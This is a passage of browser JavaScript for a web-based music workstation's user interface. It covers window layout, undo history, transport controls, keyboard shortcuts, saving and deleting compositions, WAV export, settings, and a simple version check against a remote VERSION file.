			.prompt( "Rename channel", "", DOM.channelName.textContent, "Rename" )
			.then( name => DAW.callAction( "renameChannel", id, name ) );
	}
}

const UIhistoryActions = new Map();

function UIhistoryInit() {
	DAW.cb.historyUndo = act => UIhistoryActions.get( act.index ).classList.add( "historyAction-undone" );
	DAW.cb.historyRedo = act => UIhistoryActions.get( act.index ).classList.remove( "historyAction-undone" );
	DAW.cb.historyAddAction = UIhistoryAddAction;
	DAW.cb.historyDeleteAction = UIhistoryDeleteAction;
	DOM.undo.onclick = () => DAW.history.undo();
	DOM.redo.onclick = () => DAW.history.redo();
}

function UIhistoryAddAction( act ) {
	const div = DOM.historyAction.cloneNode( true );

	UIhistoryActions.set( act.index, div );
	div.children[ 0 ].dataset.icon = act.icon;
	div.children[ 1 ].innerHTML = act.desc;
	div.onclick = () => DAW.history.goToAction( act );
	DOM.historyList.append( div );
	DOM.historyList.scrollTop = 10000000;
}

function UIhistoryDeleteAction( { index } ) {
	UIhistoryActions.get( index ).remove();
	UIhistoryActions.delete( index );
}

const UIwindows = new gsuiWindows();

function UIwindowsInit() {
	UIwindows.setRootElement( DOM.body );
	UIwindows.lowGraphics( true );
	UIwindowsAppendContent( UIwindows );
	UIwindows.onopen = win => UIwindowsBtn( win.id, true );
	UIwindows.onclose = win => {
		UIwindowsBtn( win.id, false );
		switch ( win.id ) {
			case "piano": DAW.callAction( "closePattern", "keys" ); break;
			case "drums": DAW.callAction( "closePattern", "drums" ); break;
		}
	};
	DOM.winBtns.onclick = e => {
		const btn = e.target,
			winId = btn.dataset.win;

		if ( winId ) {
			UIwindows.window( winId ).openToggle(
				!btn.classList.contains( "winBtn-open" ) );
		}
	};
	UIwindowsSetPos( "blocks",  "winBlocks",   20,  20, 180, 380, 320, 780, "folder-tree", "blocks" );
	UIwindowsSetPos( "mixer",   "winMixer",   360,  20, 266, 200, 400, 360, "mixer",       "mixer" );
	UIwindowsSetPos( "main",    "winMain",    780,  20, 380, 180, 600, 360, "music",       "composition" );
	UIwindowsSetPos( "synth",   "winSynth",   360, 400, 340, 220, 400, 400, "oscillator",  "synth" );
	UIwindowsSetPos( "piano",   "winPiano",   780, 400, 380, 180, 600, 400, "keys",        "pianoroll" );
	UIwindowsSetPos( "drums",   "winDrums",   410, 450, 380, 180, 900, 400, "drums",       "drums" );
	UIwindowsSetPos( "effects", "winEffects", 480, 120, 230, 180, 420, 360, "effects",     "effects" );
}

function UIwindowsSetPos( winId, attrId, x, y, wmin, hmin, w, h, icon, title ) {
	const win = UIwindows.window( winId );

	win.setSize( w, h );
	win.setMinSize( wmin, hmin );
	win.setTitle( title );
	win.setIdAttr( attrId );
	win.setPosition( x, y );
	win.setTitleIcon( icon );
}

function UIwindowsBtn( winId, b ) {
	DOM.winBtnsMap.get( winId ).classList.toggle( "winBtn-open", b );
}

function UIwindowsAppendContent( UIwindows ) {
	document.querySelectorAll( "div[data-window]" ).forEach( winCnt => {
		const win = UIwindows.createWindow( winCnt.dataset.window ),
			elWinCnt = win.rootElement.querySelector( ".gsuiWindow-content" ),
			children = Array.from( winCnt.children );

		winCnt.remove();
		winCnt.classList.forEach( c => elWinCnt.classList.add( c ) );
		if ( children.length ) {
			const child0 = children[ 0 ];

			if ( child0.classList.contains( "windowMenu" ) ) {
				children.shift();
				win.headAppend( ...child0.children );
			}
			win.append( ...children );
		}
	} );
}

function UIpatternsInit() {
	const win = UIwindows.window( "blocks" );

	UIpatterns.setDAWCore( DAW );
	win.append( UIpatterns.rootElement );
	gsuiPatterns.selectChanPopupContent.classList.add( "popup" );
}

function UIpatternsBuffersLoaded( buffers ) {
	UIpatterns.bufferLoaded( buffers );
	UIpatternroll.getBlocks().forEach( ( elBlc, blcId ) => {
		const blc = DAW.get.block( blcId ),
			pat = DAW.get.pattern( blc.pattern );

		if ( pat.type === "buffer" && pat.buffer in buffers ) {
			UIpatterns.svgForms.buffer.setSVGViewbox( elBlc._gsuiSVGform, blc.offset, blc.duration, DAW.get.bpm() / 60 );
		}
	} );
}

function UIupdatePattern( id, obj ) {
	if ( obj ) {
		if ( "duration" in obj ) {
			const foc = DAW.getFocusedName();

			if ( ( foc === "pianoroll" && id === DAW.get.patternKeysOpened() ) ||
				( foc === "drums" && id === DAW.get.patternDrumsOpened() )
			) {
				DOM.sliderTime.setAttribute( "max", obj.duration );
			}
		}
		if ( "name" in obj ) {
			const name = obj.name;

			UIpatternroll.getBlocks().forEach( blc => {
				if ( blc.dataset.pattern === id ) {
					blc.querySelector( ".gsuiPatternroll-block-name" ).textContent = name;
				}
			} );
			if ( id === DAW.get.patternKeysOpened() ) {
				DOM.pianorollName.textContent = name;
			}
			if ( id === DAW.get.patternDrumsOpened() ) {
				DOM.drumsName.textContent = name;
			}
		}
	}
}

function UIupdatePatternsBPM( bpm ) {
	const bps = bpm / 60;

	UIpatternroll.getBlocks().forEach( ( elBlc, blcId ) => {
		const blc = DAW.get.block( blcId ),
			pat = DAW.get.pattern( blc.pattern ),
			svg = elBlc._gsuiSVGform;

		if ( svg && pat.type === "buffer" ) {
			UIpatterns.svgForms.buffer.setSVGViewbox( svg, blc.offset, blc.duration, bps );
		}
	} );
}

const UIclock = GSUI.createElement( "gsui-clock" );

function UIcontrolsInit() {
	const sliderGain = DOM.headGain.querySelector( "gsui-slider" ),
		sliderTime = DOM.headCurrentTime.querySelector( "gsui-slider" );

	DOM.sliderTime = sliderTime;
	DOM.play.onclick = UIcontrolsClickPlay;
	DOM.stop.onclick = UIcontrolsClickStop;
	DOM.headTempo.onclick = UIcontrolsClickTempo;
	DOM.playToggle.onclick = UIcontrolsClickPlayToggle;
	DOM.tempoBPMTap.onclick = UIcontrolsBPMTap;
	DOM.headCmpInfo.onclick = UIcontrolsClickCmp;
	DOM.headCmpSave.onclick = UIcompositionClickSave;
	DOM.cmpsBtn.onmousedown =
	DOM.undoMore.onmousedown = UIcontrolsDropdownBtnClick;
	sliderGain.oninput = v => DAW.destination.setGain( v );
	sliderGain.setValue( DAW.destination.getGain() );
	sliderTime.oninput = UIcontrolsSliderTime_oninput;
	sliderTime.onchange = UIcontrolsSliderTime_onchange;
	sliderTime.oninputend = UIcontrolsSliderTime_oninputend;
	sliderTime.oninputstart = UIcontrolsSliderTime_inputstart;
	UIclock.classList.add( "btnGroup", "btnMarge" );
	DOM.headPlay.after( UIclock );
	UIclock.onchangeDisplay = mode => localStorage.setItem( "gsuiClock.display", mode );
	GSUI.setAttribute( UIclock, "mode", localStorage.getItem( "gsuiClock.display" ) || "second" );
}

function UIcontrolsSliderTime_inputstart( beat ) {
	DAW.cb.clockUpdate = null;
	UIclock.setTime( beat );
}
function UIcontrolsSliderTime_oninputend( _beat ) {
	DAW.cb.clockUpdate = UIcontrolsClockUpdate;
}
function UIcontrolsSliderTime_oninput( beat ) {
	const beatRound = UIcontrolsGetFocusedGrid().timeline.previewCurrentTime( beat );

	UIclock.setTime( beatRound );
}
function UIcontrolsSliderTime_onchange() {
	const beat = UIcontrolsGetFocusedGrid().timeline.previewCurrentTime( false );

	DAW.getFocusedObject().setCurrentTime( beat );
}

function UIcontrolsBPMTap() {
	DOM.tempoBPM.value = Math.floor( gswaBPMTap.tap() );
}

function UIcontrolsClockUpdate( beat ) {
	UIclock.setTime( beat );
}

function UIcontrolsCurrentTime( beat, focused ) {
	UIcontrolsGetFocusedGrid( focused ).currentTime( beat );
	DOM.sliderTime.setValue( beat );
}

function UIcontrolsClickCmp() {
	gsuiPopup.prompt( "Composition's title", "", DAW.get.name(), "Rename" )
		.then( name => DAW.callAction( "renameComposition", name ) );
}

function UIcontrolsClickPlay() {
	DAW.togglePlay();
}

function UIcontrolsClickPlayToggle() {
	DAW.getFocusedName() === "composition"
		? DAW.pianorollFocus( "-f" )
		: DAW.compositionFocus( "-f" );
}

function UIcontrolsClickStop() {
	DAW.stop();
	switch ( document.activeElement ) {
		case UIdrums.rootElement: DAW.drumsFocus( "-f" ); break;
		case UIpianoroll.rootElement: DAW.pianorollFocus( "-f" ); break;
		case UIpatternroll.rootElement: DAW.compositionFocus( "-f" ); break;
	}
}

function UIcontrolsGetFocusedGrid( focStr = DAW.getFocusedName() ) {
	return focStr === "composition"
		? UIpatternroll
		: focStr === "drums"
			? UIdrums
			: UIpianoroll;
}

function UIcontrolsFocusOn( focStr, b ) {
	if ( b ) {
		const focObj = DAW.getFocusedObject(),
			beat = focObj.getCurrentTime(),
			duration = ( focObj === DAW.composition ? focObj.cmp : focObj ).duration,
			grid = UIcontrolsGetFocusedGrid( focStr ),
			onCmp = focStr === "composition";

		DOM.playToggle.dataset.dir = onCmp ? "up" : "down";
		DOM.sliderTime.setAttribute( "max", duration || DAW.get.beatsPerMeasure() );
		DOM.sliderTime.setValue( beat );
		UIdrums.rootElement.classList.toggle( "selected", focStr === "drums" );
		UIpianoroll.rootElement.classList.toggle( "selected", focStr === "pianoroll" );
		UIpatternroll.rootElement.classList.toggle( "selected", onCmp );
		grid.rootElement.focus();
	}
}

function UIcontrolsDropdownBtnClick( e ) {
	const foc = document.activeElement,
		tar = e.currentTarget;

	if ( foc === tar || foc === tar.nextElementSibling ) {
		e.preventDefault();
		foc.blur();
	}
}

function UIcontrolsClickTempo() {
	DOM.tempoBeatsPM.value = DAW.get.beatsPerMeasure();
	DOM.tempoStepsPB.value = DAW.get.stepsPerBeat();
	DOM.tempoBPM.value = DAW.get.bpm();
	gswaBPMTap.reset();
	gsuiPopup.custom( {
		title: "Tempo",
		element: DOM.tempoPopupContent,
		submit( d ) {
			DAW.callAction( "changeTempo", d.bpm, d.beatsPerMeasure, d.stepsPerBeat );
		},
	} );
}

const UIkeyboardFns = [];

function UIkeyboardInit() {
	UIkeyboardFns.push(
		// ctrlOrAlt, alt, key, fn
		[ true,  false, "o", UIopenPopupShow ],
		[ true,  false, "s", UIcompositionClickSave ],
		[ true,  true,  "n", UIcompositionClickNewLocal ],
		[ true,  false, "z", DOM.undo.onclick ],
		[ true,  false, "Z", DOM.redo.onclick ],
		[ false, false, " ", () => {
			DAW.isPlaying()
				? DOM.stop.onclick()
				: DOM.play.onclick();
		} ],
	);
}

function UIkeyboardUp( e ) {
	UIpianorollKeyboardEvent( false, e );
}

function UIkeyboardDown( e ) {
	if ( !UIkeyboardShortcuts( e ) && !e.ctrlKey && !e.altKey && !e.shiftKey ) {
		UIpianorollKeyboardEvent( true, e );
	}
}

function UIkeyboardShortcuts( e ) {
	return UIkeyboardFns.some( ( [ ctrlOrAlt, alt, key, fn ] ) => {
		if ( ( key === e.key ) &&
			( !alt || e.altKey ) &&
			( ctrlOrAlt === ( e.ctrlKey || e.altKey ) )
		) {
			fn();
			e.preventDefault();
			return true;
		}
	} );
}

function UIopenPopupShow() {
	DOM.inputOpenFile.value =
	DOM.inputOpenURL.value = "";
	gsuiPopup.custom( {
		title: "Open",
		submit: UIopenPopupSubmit,
		element: DOM.openPopupContent,
	} );
	return false;
}

function UIopenPopupSubmit( { url, file } ) {
	if ( url || file[ 0 ] ) {
		return ( url
			? DAW.addCompositionByURL( url )
			: DAW.addCompositionByBlob( file[ 0 ] )
		).then( cmp => DAW.openComposition( "local", cmp.id ) );
	}
}

function UIpianorollInit() {
	const win = UIwindows.window( "piano" );

	DOM.pianorollName.onclick = UIpianorollNameClick;
	DOM.pianorollForbidden.classList.remove( "hidden" );
	win.onfocusin = UIpianorollWindowFocusin;
	win.append( UIpianoroll.rootElement );
	UIpianoroll.setDAWCore( DAW );
	UIpianoroll.rootElement.onfocus = () => DAW.pianorollFocus();
	UIpianoroll.attached();
}

function UIpianorollWindowFocusin( e ) {
	if ( !UIpianoroll.rootElement.contains( e.target ) ) {
		UIpianoroll.rootElement.focus();
	}
}

function UIpianorollNameClick() {
	const id = DAW.get.patternKeysOpened(),
		name = DOM.pianorollName.textContent;

	gsuiPopup.prompt( "Rename pattern", "", name, "Rename" )
		.then( name => DAW.callAction( "renamePattern", id, name ) );
}

function UIpianorollKeyboardEvent( status, e ) {
	const uiKeys = UIpianoroll.getUIKeys(),
		midi = uiKeys.getMidiKeyFromKeyboard( e );

	if ( midi !== false ) {
		status
			? uiKeys.midiKeyDown( midi )
			: uiKeys.midiKeyUp( midi );
		return true;
	}
}

function UIaboutPopupInit() {
	DOM.helpAbout.onclick = UIaboutPopupShow;
	DOM.versionCheck.onclick = UIaboutPopupVersionCheck;
}

function UIaboutPopupShow() {
	gsuiPopup.custom( {
		title: "About",
		element: DOM.aboutPopupContent,
	} );
	return false;
}

function UIaboutPopupVersionCheck() {
	const dt = DOM.versionIcon.dataset;

	dt.icon = "none";
	dt.spin = "on";
	fetch( `https://squencer.netlify.app/daw-core/VERSION?${ Math.random() }` )
		.then( res => res.text(), GSUtils.noop )
		.then( res => {
			dt.spin = "";
			dt.icon = res === VERSION ? "check" : "warning";
		} );
	return false;
}

function UIpatternrollInit() {
	const win = UIwindows.window( "main" );

	UIpatternroll.setDAWCore( DAW );
	UIpatternroll.setSVGForms( UIpatterns.svgForms );
	UIpatternroll.rootElement.onfocus = () => DAW.compositionFocus();
	win.onfocusin = UIpatternrollWindowFocusin;
	win.append( UIpatternroll.rootElement );
	UIpatternroll.attached();
}

function UIpatternrollWindowFocusin( e ) {
	if ( !UIpatternroll.rootElement.contains( e.target ) ) {
		UIpatternroll.rootElement.focus();
	}
}

function UIrenderPopupInit() {
	DOM.headExport.onclick = UIrenderPopupShow;
	DOM.renderBtn.onclick = UIrenderPopupRender;
}

function UIrenderPopupShow() {
	DOM.renderProgress.value = 0;
	DOM.renderBtn.dataset.status = "0";
	DOM.renderBtn.href = "";
	gsuiPopup.custom( {
		ok: "Close",
		title: "Render",
		element: DOM.renderPopupContent,
	} ).then( () => DAW.abortWAVExport() );
	return false;
}

function UIrenderPopupRender() {
	const a = DOM.renderBtn,
		d = a.dataset;

	if ( d.status === "2" ) {
		return;
	} else if ( d.status === "0" ) {
		const dur = DAW.get.duration() * 60 / DAW.get.bpm();

		d.status = "1";
		UIrenderPopupRender._intervalId = setInterval( () => {
			DOM.renderProgress.value = DAW.ctx.currentTime / dur;
		}, 100 );
		DAW.exportCompositionToWAV().then( obj => {
			clearInterval( UIrenderPopupRender._intervalId );
			DOM.renderProgress.value = 1;
			d.status = "2";
			a.href = obj.url;
			a.download = obj.name;
		} );
	}
	return false;
}

const UImainAnalyser = new gsuiSpectrum();

function UImainAnalyserInit() {
	UImainAnalyser.setCanvas( DOM.headAnalyser );
	UImainAnalyser.setResolution( 140 );
}

const UIcompositions = Object.seal( {
	cloud: new Map(),
	local: new Map(),
	get( cmp ) {
		return this[ cmp.options.saveMode ].get( cmp.id );
	},
	set( cmp, html ) {
		this[ cmp.options.saveMode ].set( cmp.id, html );
	},
	delete( cmp ) {
		this[ cmp.options.saveMode ].delete( cmp.id );
	},
} );

function UIcompositionsInit() {
	DOM.cmpsCloudList.onclick =
	DOM.cmpsLocalList.onclick = UIcompositionClick;
	DOM.cloudNewCmp.onclick = UIcompositionClickNewCloud;
	DOM.localNewCmp.onclick = UIcompositionClickNewLocal;
	DOM.localOpenCmp.onclick = UIopenPopupShow;
	DOM.cmpsCloudList.ondragstart = UIcompositionDragstart.bind( null, "cloud" );
	DOM.cmpsLocalList.ondragstart = UIcompositionDragstart.bind( null, "local" );
	DOM.cmpsCloudList.ondrop = UIcompositionCloudDrop;
	DOM.cmpsLocalList.ondrop = UIcompositionLocalDrop;
}

function UIcompositionDragstart( from, e ) {
	const elCmp = e.target.closest( ".cmp" );

	e.dataTransfer.setData( "text/plain", `${ from }:${ elCmp.dataset.id }` );
}

function UIcompositionDrop( from, to, e ) {
	const [ saveMode, id ] = e.dataTransfer.getData( "text/plain" ).split( ":" );

	if ( saveMode === from ) {
		const cmpFrom = DAW.get.composition( from, id ),
			cmpTo = DAW.get.composition( to, id );

		return !cmpTo
			? Promise.resolve( cmpFrom )
			: gsuiPopup.confirm( "Warning",
				"Are you sure you want to overwrite " +
				`the <b>${ to }</b> composition <i>${ cmpTo.name || "Untitled" }</i>&nbsp;?` )
			.then( b => {
				if ( b ) {
					return cmpFrom;
				}
				throw undefined;
			} );
	}
	return Promise.reject();
}

function UIcompositionLocalDrop( e ) {
	UIcompositionDrop( "cloud", "local", e )
		.then( cmp => DAW.addComposition( cmp, { saveMode: "local" } ) )
		.then( cmp => DAWCore.LocalStorage.put( cmp.id, cmp ) );
}

function UIcompositionCloudDrop( e ) {
	if ( gsapiClient.user.id ) {
		UIcompositionDrop( "local", "cloud", e )
			.then( cmp => UIauthSaveComposition( cmp ) )
			.then( cmp => DAW.addComposition( cmp, { saveMode: "cloud" } ) );
	} else {
		gsuiPopup.alert( "Error",
			"You need to be connected to your account before uploading your composition" );
	}
}

function UIcompositionClick( e ) {
	const cmp = e.target.closest( ".cmp" );

	if ( cmp ) {
		const id = cmp.dataset.id,
			saveMode = DOM.cmpsLocalList.contains( cmp ) ? "local" : "cloud";

		switch ( e.target.dataset.action ) {
			case "save": UIcompositionClickSave(); break;
			case "open": UIcompositionClickOpen( saveMode, id ); e.preventDefault(); break;
			case "json": UIcompositionClickJSONExport( saveMode, id, e ); break;
			case "delete": UIcompositionClickDelete( saveMode, id ); break;
		}
	}
}

function UIcompositionBeforeUnload() {
	if ( DAW.compositionNeedSave() ) {
		return "Data unsaved";
	}
}

function UIcompositionOpened( cmp ) {
	const html = UIcompositions.get( cmp ),
		par = html.root.parentNode;

	html.root.classList.add( "cmp-loaded" );
	par.prepend( html.root );
	par.scrollTop = 0;
	DOM.headCmp.dataset.saveMode =
	DOM.headCmpIcon.dataset.icon = cmp.options.saveMode;
	DOM.headCmpSave.dataset.icon = cmp.options.saveMode === "local" ? "save" : "upload";
	UIpatterns._uiPatterns.expandSynth( cmp.synthOpened, true );
	UIeffectsSelectChan( "main" );
	UItitle( cmp.name );
}

function UIcompositionLoading( cmp, loading ) {
	DOM.headCmpSave.dataset.spin =
	UIcompositions.get( cmp ).save.dataset.spin = loading ? "on" : "";
}

function UIcompositionSavedStatus( cmp, saved ) {
	DOM.headCmp.classList.toggle( "cmp-saved", saved );
	UIcompositions.get( cmp ).root.classList.toggle( "cmp-saved", saved );
	UItitle( cmp.name );
}

function UIcompositionDeleted( cmp ) {
	const html = UIcompositions.get( cmp );

	if ( html ) {
		html.root.remove();
		UIcompositions.delete( cmp );
	}
}

function UIcompositionAdded( cmp ) {
	const html = UIcompositions.get( cmp );

	if ( html ) {
		UIcompositionSetInfo( html, cmp );
	} else {
		const root = DOM.cmp.cloneNode( true ),
			local = cmp.options.saveMode === "local",
			html = {
				root,
				bpm: root.querySelector( ".cmp-bpm" ),
				name: root.querySelector( ".cmp-name" ),
				save: root.querySelector( ".cmp-save" ),
				duration: root.querySelector( ".cmp-duration" ),
			};

		root.dataset.id = cmp.id;
		UIcompositionSetInfo( html, cmp );
		UIcompositions.set( cmp, html );
		html.save.dataset.icon = local ? "save" : "upload";
		( local
			? DOM.cmpsLocalList
			: DOM.cmpsCloudList ).append( root );
	}
}

function UIcompositionSetInfo( html, cmp ) {
	const [ min, sec ] = GSUtils.parseBeatsToSeconds( cmp.duration, cmp.bpm );

	html.bpm.textContent = cmp.bpm;
	html.name.textContent = cmp.name;
	html.duration.textContent = `${ min }:${ sec }`;
}

function UIcompositionClosed( cmp ) {
	UIcompositionChanged( {
		bpm: cmp.bpm,
		name: cmp.name,
		duration: cmp.duration,
	}, {} );
	UIcompositions.get( cmp ).root.classList.remove( "cmp-loaded" );
	UIdrums.clear();
	UIdrums.loop( false );
	UIeffects.clear();
	UIsynth.clear();
	UImixer.clear();
	UIpatternroll.clear();
	UIpatternroll.loop( false );
	UIpianoroll.clear();
	UIpianoroll.loop( false );
	DOM.drumsName.textContent =
	DOM.synthName.textContent =
	DOM.pianorollName.textContent = "";
	DOM.pianorollForbidden.classList.add( "hidden" );
	UIpatterns.clear();
}

function UIcompositionClickNewLocal() {
	( !DAW.compositionNeedSave()
		? DAW.addNewComposition()
		: gsuiPopup.confirm( "Warning", "Are you sure you want to discard unsaved works" )
			.then( b => b && DAW.addNewComposition() )
	).then( cmp => cmp && DAW.openComposition( "local", cmp.id ) );
	return false;
}

function UIcompositionClickNewCloud() {
	if ( !gsapiClient.user.id ) {
		gsuiPopup.alert( "Error",
			"You can not create a new composition in the <b>cloud</b><br/>without being connected" );
	} else {
		const saveMode = "cloud",
			opt = { saveMode };

		( !DAW.compositionNeedSave()
			? DAW.addNewComposition( opt )
			: gsuiPopup.confirm( "Warning", "Are you sure you want to discard unsaved works" )
				.then( b => b && DAW.addNewComposition( opt ) )
		).then( cmp => cmp && DAW.openComposition( saveMode, cmp.id ) );
	}
	return false;
}

function UIcompositionClickDelete( saveMode, id ) {
	const html = UIcompositions[ saveMode ].get( id ),
		name = html.name.textContent;

	gsuiPopup.confirm( "Warning",
		`Are you sure you want to delete "${ name }" ? (no undo possible)`,
		"Delete"
	).then( b => {
		if ( b ) {
			( saveMode === "cloud"
			? gsapiClient.deleteComposition( id )
			: Promise.resolve() )
				.catch( err => {
					if ( err.code !== 404 ) {
						gsuiPopup.alert( `Error ${ err.code }`,
							"An error happened while deleting " +
							"your composition&nbsp;:<br/>" +
							`<code>${ err.msg || err }</code>` );
						throw err;
					}
				} )
				.then( () => {
					if ( id === DAW.get.id() ) {
						for ( let next = html.root.nextElementSibling;
							next;
							next = next.nextElementSibling
						) {
							if ( next.dataset.id ) {
								DAW.openComposition( saveMode, next.dataset.id );
								break;
							}
						}
					}
					DAW.deleteComposition( saveMode, id );
				} );
		}
	} );
}

function UIcompositionClickJSONExport( saveMode, id, e ) {
	const json = DAW.exportCompositionToJSON( saveMode, id );

	e.target.href = json.url;
	e.target.download = json.name;
}

function UIcompositionClickOpen( saveMode, id ) {
	if ( DAW.compositionNeedSave() ) {
		gsuiPopup.confirm( "Warning",
			"Are you sure you want to discard unsaved works"
		).then( ok => ok && DAW.openComposition( saveMode, id ) );
	} else {
		DAW.openComposition( saveMode, id );
	}
	return false;
}

function UIcompositionClickSave() {
	if ( document.cookie.indexOf( "cookieAccepted" ) > -1 ) {
		DAW.saveComposition();
	} else {
		gsuiPopup.alert( "Error",
			"You have to accept our cookies before saving locally your composition." );
	}
}

function UIsettingsPopupInit() {
	DOM.headSettings.onclick = UIsettingsPopupShow;
	DOM.settingsUIRateManual.oninput = UIsettingsPopupUIRateOninput;
	DAW.setLoopRate( UIsettingsGetUIRate() );
	UIwindows.lowGraphics( UIsettingsGetLowGraphicsValue() );
}

function UIsettingsPopupUIRateOninput( e ) {
	DOM.settingsUIRateManualFps.textContent = DOM.settingsUIRateManual.value.padStart( 2, "0" );
	if ( e ) {
		DOM.settingsUIRateModeManual.checked = true;
	}
}

function UIsettingsGetLowGraphicsValue() {
	return !!+( localStorage.getItem( "gsuiWindows.lowGraphics" ) || "0" );
}

function UIsettingsGetUIRate() {
	return +localStorage.getItem( "uiRefreshRate" ) || 60;
}

function UIsettingsPopupShow() {
	const uiRefreshRate = UIsettingsGetUIRate();

	( uiRefreshRate >= 60
		? DOM.settingsUIRateModeAuto
		: DOM.settingsUIRateModeManual ).checked = true;
	DOM.settingsUIRateManual.value = uiRefreshRate;
	DOM.settingsWindowsMode.checked = !UIsettingsGetLowGraphicsValue();
	UIsettingsPopupUIRateOninput();
	gsuiPopup.custom( {
		title: "Settings",
		submit: UIsettingsPopupSubmit,
		element: DOM.settingsPopupContent,
	} ).then();
}

function UIsettingsPopupSubmit( form ) {
	const rate = form.UIRateMode === "auto" ? 60 : form.UIRateManual,
		lowGraphics = !form.windowsDirectMode;

	DAW.setLoopRate( rate );
	UIwindows.lowGraphics( lowGraphics );
	localStorage.setItem( "uiRefreshRate", rate );
	localStorage.setItem( "gsuiWindows.lowGraphics", +lowGraphics );
}

function UIshortcutsPopupInit() {
	DOM.helpKeyboardShortcuts.onclick = UIshortcutsPopupShow;
}

function UIshortcutsPopupShow() {
	gsuiPopup.custom( {
		title: "Keyboard / mouse shortcuts",
		element: DOM.shortcutsPopupContent,
	} );
	return false;
}

function UIcompositionChanged( obj, prevObj ) {
	console.log( "change", obj );
	UIpatterns.change( obj );
	UIsynth.change( obj );
	UIdrums.change( obj );
	UIeffects.change( obj );
	UImixer.change( obj );
	UIpianoroll.change( obj );
	UIpatternroll.change( obj );
	UIcompositionChanged.fn.forEach( ( fn, attrs ) => {
		if ( attrs.some( attr => attr in obj ) ) {
			fn( obj, prevObj );
		}
	} );
}

UIcompositionChanged.fn = new Map( [
	[ [ "channels" ], function( obj ) {
		const synOpenedChan = obj.channels[ DAW.get.synth( DAW.get.synthOpened() ).dest ],
			mixerSelectedChan = obj.channels[ UIeffects.getDestFilter() ];

		if ( synOpenedChan && "name" in synOpenedChan ) {
			DOM.synthChannelBtnText.textContent = synOpenedChan.name;
		}
		if ( mixerSelectedChan && "name" in mixerSelectedChan ) {
			UIeffectsRenameChan( mixerSelectedChan.name );
		}
	} ],
	[ [ "synths" ], function( obj ) {
		const synOpened = obj.synths[ DAW.get.synthOpened() ];

		if ( synOpened ) {
			UIsynthChange( synOpened );
		}
	} ],
	[ [ "patterns" ], function( obj ) {
		Object.entries( obj.patterns ).forEach( kv => UIupdatePattern( ...kv ) );
	} ],
	[ [ "beatsPerMeasure", "stepsPerBeat" ], function() {
		const bPM = DAW.get.beatsPerMeasure(),
			sPB = DAW.get.stepsPerBeat();

		UIclock.setAttribute( "stepsPerBeat", sPB );
		DOM.beatsPerMeasure.textContent = bPM;
		DOM.stepsPerBeat.textContent = sPB;
	} ],
	[ [ "bpm" ], function( { bpm } ) {
		UIclock.setAttribute( "bpm", bpm );
		DOM.bpm.textContent =
		UIcompositions.get( DAW.get.cmp() ).bpm.textContent = bpm;
		UIupdatePatternsBPM( bpm );
	} ],
	[ [ "name" ], function( { name } ) {
		UItitle( name );
		DOM.headCmpName.textContent =
		UIcompositions.get( DAW.get.cmp() ).name.textContent = name;
	} ],
	[ [ "duration" ], function( { duration } ) {
		const [ min, sec ] = GSUtils.parseBeatsToSeconds( duration, DAW.get.bpm() );

		if ( DAW.getFocusedName() === "composition" ) {
			DOM.sliderTime.setAttribute( "max", duration );
		}
		DOM.headCmpDur.textContent =
		UIcompositions.get( DAW.get.cmp() ).duration.textContent = `${ min }:${ sec }`;
	} ],
	[ [ "patternDrumsOpened" ], function( obj ) {
		if ( obj.patternDrumsOpened ) {
			const pat = DAW.get.pattern( obj.patternDrumsOpened );

			DOM.drumsName.textContent = pat.name;
			UIwindows.window( "drums" ).open();
			if ( DAW.getFocusedName() === "drums" ) {
				DOM.sliderTime.setAttribute( "max", pat.duration );
			}
		} else {
			DOM.drumsName.textContent = "";
		}
	} ],
	[ [ "synthOpened" ], function( obj ) {
		if ( obj.synthOpened ) {
			const syn = DAW.get.synth( obj.synthOpened );

			DOM.synthName.textContent = syn.name;
			DOM.synthChannelBtn.onclick = UImixerOpenChanPopup.bind( null, obj.synthOpened );
			UIwindows.window( "synth" ).open();
		} else {
			DOM.synthName.textContent = "";
			DOM.synthChannelBtn.onclick = null;
		}
	} ],
	[ [ "patternKeysOpened" ], function( { patternKeysOpened } ) {
		if ( patternKeysOpened ) {
			const pat = DAW.get.pattern( patternKeysOpened );

			DOM.pianorollName.textContent = pat.name;
			DOM.pianorollForbidden.classList.add( "hidden" );
			if ( DAW.getFocusedName() === "pianoroll" ) {
				DOM.sliderTime.setAttribute( "max", pat.duration );
			}
			UIwindows.window( "piano" ).open();
		} else {
			DOM.pianorollName.textContent = "";
			DOM.pianorollForbidden.classList.remove( "hidden" );
		}
	} ],
] );

UIloading().then( UIrun ).then( UIloaded );

function UIrun() {
	const DAW = new DAWCore(),
		hash = new Map( location.hash
			.substr( 1 )
			.split( "&" )
			.map( kv => kv.split( "=" ) )
		);

	gswaPeriodicWaves.list.forEach( ( w, name ) => {
		gsuiPeriodicWave.addWave( name, w.real, w.imag );
	} );

	window.DAW = DAW;
	window.VERSION = "15.0.2";

	window.UIdrums = new GSDrums();
	window.UIeffects = new GSEffects();
	window.UImixer = new GSMixer();
	window.UIpatternroll = new GSPatternroll();
	window.UIpatterns = new GSPatterns();
	window.UIpianoroll = new GSPianoroll();
	window.UIsynth = new GSSynth();

	UIdomInit();
	UIwindowsInit();

	UIauthInit();
	UIdrumsInit();
	UImixerInit();
	UIsynthInit();
	UIcookieInit();
	UIeffectsInit();
	UIhistoryInit();
	UIcontrolsInit();
	UIkeyboardInit();
	UIpatternsInit();
	UIpianorollInit();
	// UImidiPopupInit();
	UIaboutPopupInit();
	UIpatternrollInit();
	UIrenderPopupInit();
	UImainAnalyserInit();
	UIcompositionsInit();
	UIsettingsPopupInit();
	UIshortcutsPopupInit();

	window.onblur = () => UIpianoroll.getUIKeys().midiReleaseAllKeys();
	window.onkeyup = UIkeyboardUp;
	window.onkeydown = UIkeyboardDown;
	window.onbeforeunload = UIcompositionBeforeUnload;
	document.body.ondrop = UIdrop;
	document.body.ondragover = () => false;
	document.addEventListener( "wheel", e => {
		if ( e.ctrlKey ) {
			e.preventDefault();
		}
	}, { passive: false } );
	document.addEventListener( "drop", e => {
		DAW.dropAudioFiles( e.dataTransfer.files );
	} );

	DAW.cb.focusOn = UIcontrolsFocusOn;
	DAW.cb.currentTime = UIcontrolsCurrentTime;
	DAW.cb.clockUpdate = UIcontrolsClockUpdate;
	DAW.cb.buffersLoaded = UIpatternsBuffersLoaded;
	DAW.cb.compositionAdded = UIcompositionAdded;
	DAW.cb.compositionOpened = UIcompositionOpened;
	DAW.cb.compositionClosed = UIcompositionClosed;
	DAW.cb.compositionChanged = UIcompositionChanged;
	DAW.cb.compositionDeleted = UIcompositionDeleted;
	DAW.cb.compositionLoading = UIcompositionLoading;
	DAW.cb.compositionSavedStatus = UIcompositionSavedStatus;
